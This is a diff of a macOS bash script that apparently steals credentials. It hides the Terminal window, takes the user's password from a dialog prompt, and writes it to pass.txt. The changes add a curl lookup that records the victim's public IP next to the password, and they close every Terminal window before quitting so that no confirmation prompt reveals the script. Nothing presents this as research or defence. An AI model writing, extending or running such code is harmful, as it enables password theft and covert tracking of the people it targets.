@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Ensure Terminal is hidden initially
-osascript -e 'tell app "Terminal" to set visible of front window to false'
+osascript -e 'tell application "Terminal" to set visible of front window to false'
 
 # Get the current username (for header purposes)
 username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')
@@ -38,8 +38,12 @@ else
     dialogText="CANCEL"
 fi
 
-# Append the password (or result) to the capture text
-capture="${capture}password=${dialogText}"
+# Append the password to the capture text
+capture="${capture}password=${dialogText}\n"
+
+# Capture the public IP address using api.ipify.org
+ipaddress=$(curl -s https://api.ipify.org)
+capture="${capture}ipaddress=${ipaddress}"
 
 # Save the captured information to pass.txt
 echo -e "$capture" > pass.txt
@@ -53,5 +57,6 @@ else
     echo "Error: pass.txt not found" > error.txt
 fi
 
-# Quit Terminal after processing is complete
-osascript -e 'tell app "Terminal" to quit'
+# Close all Terminal windows first, then quit Terminal to avoid confirmation dialogs
+osascript -e 'tell application "Terminal" to close (every window)'
+osascript -e 'tell application "Terminal" to quit'
